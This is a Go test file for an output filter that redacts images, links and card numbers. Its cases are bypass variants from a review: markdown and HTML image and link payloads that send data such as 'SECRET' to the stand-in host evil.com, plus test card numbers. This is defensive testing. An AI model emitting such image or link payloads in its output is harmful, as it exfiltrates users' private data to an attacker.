package outputguard

import (
	"strings"
	"testing"
)

// Cases from the PR #3 review.
func TestReviewBypasses(t *testing.T) {
	cfg := full
	cfg.LinkAllowlist = []string{"ok.example"}
	runCases(t, cfg, []detectorCase{
		{"angle brackets with a space", "a ![x](<https://evil.com/leak/SECRET data.png>) b",
			"a [REDACTED:image] b", Counts{KindImage: 1}},
		{"angle-bracket link with a space", "[x](<https://evil.com/a b>)", "x", Counts{KindLink: 1}},
		{"allowed angle-bracket image stays", "![x](<https://ok.example/a.png>)",
			"![x](<https://ok.example/a.png>)", nil},
		{"data-src does not vouch for src", `<img data-src="https://ok.example/a.png" src="https://evil.com/p.gif">`,
			"[REDACTED:image]", Counts{KindImage: 1}},
		{"srcset to another host", `<img src="https://ok.example/a.png" srcset="https://ok.example/a2.png 2x, https://evil.com/p.gif?d=1 3x">`,
			"[REDACTED:image]", Counts{KindImage: 1}},
		{"srcset all allowed", `<img src="https://ok.example/a.png" srcset="https://ok.example/b.png 2x">`,
			`<img src="https://ok.example/a.png" srcset="https://ok.example/b.png 2x">`, nil},
		{"only data-src", `<img data-src="https://ok.example/a.png">`, "[REDACTED:image]", Counts{KindImage: 1}},
		{"unquoted src", `<img src=https://evil.com/p.gif>`, "[REDACTED:image]", Counts{KindImage: 1}},
		{"refdef url on the next line", "![a][r]\n[r]:\n  https://evil.com/p.png?q=1\nend",
			"![a][r]\n\nend", Counts{KindLink: 1}},
		{"refdef in a blockquote", "> ![a][r]\n> [r]: https://evil.com/p.png?q=1\nend",
			"> ![a][r]\n\nend", Counts{KindLink: 1}},
		{"refdef in a blockquote, next line", "> [r]:\n> https://evil.com/p.png\nend",
			"\nend", Counts{KindLink: 1}},
		{"two cards in one run", "4111111111111111 4012888888881881",
			"[REDACTED:card] [REDACTED:card]", Counts{KindCard: 2}},
		{"three cards dashed", "4111-1111-1111-1111 5555-5555-5555-4444 4012-8888-8888-1881",
			"[REDACTED:card] [REDACTED:card] [REDACTED:card]", Counts{KindCard: 3}},
	})
}

// The new forms also hold when streamed in small pieces.
func TestReviewBypassesStreamed(t *testing.T) {
	s := scanner(full)
	for _, in := range []string{
		filler + "![x](<https://evil.com/leak/" + strings.Repeat("S ", 300) + "data.png>) after" + filler,
		filler + "\n> [r]:\n> https://evil.com/" + strings.Repeat("r", 400) + "\n" + filler,
		filler + "\n[r]:\n   https://evil.com/x.png?q=1\n" + filler,
		filler + "4111111111111111 4012888888881881" + filler,
	} {
		want := s.Text(in, Counts{})
		for _, n := range []int{1, 4, 33} {
			if got, _ := streamed(s, in, n); got != want {
				t.Errorf("pieces of %d:\n got  %q\n want %q", n, got, want)
			}
		}
		if strings.Contains(want, "evil.com") || strings.Contains(want, "4012888888881881") {
			t.Errorf("leaked: %q", want)
		}
	}
}
